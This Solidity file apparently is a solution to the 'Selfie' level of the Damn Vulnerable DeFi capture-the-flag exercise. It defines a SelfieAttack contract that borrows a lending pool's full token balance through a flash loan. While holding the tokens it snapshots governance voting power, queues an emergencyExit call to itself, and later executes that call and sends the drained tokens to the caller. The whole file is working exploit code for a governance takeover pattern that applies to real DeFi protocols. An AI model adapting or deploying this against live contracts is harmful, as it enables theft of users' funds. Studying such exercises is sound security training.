// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface ISelfiePool {
    function token() external view returns (address);

    function governance() external view returns (address);

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function emergencyExit(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address target,
        uint128 value,
        bytes calldata data
    ) external returns (uint256 actionId);

    function executeAction(uint256 actionId)
        external
        payable
        returns (bytes memory returndata);
}

interface IDamnValuableTokenSnapshot {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function snapshot() external returns (uint256 lastSnapshotId);
}

contract SelfieAttack is IERC3156FlashBorrower {
    ISelfiePool pool;
    IDamnValuableTokenSnapshot token;
    ISimpleGovernance governance;
    uint256 actionId;

    constructor(address _pool) {
        pool = ISelfiePool(_pool);
        token = IDamnValuableTokenSnapshot(pool.token());
        governance = ISimpleGovernance(pool.governance());
    }

    function proposeAction() external {
        pool.flashLoan(
            this,
            address(token),
            token.balanceOf(address(pool)),
            ""
        );
    }

    function executeAction() external {
        governance.executeAction(actionId);

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();

        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSelector(pool.emergencyExit.selector, address(this))
        );

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
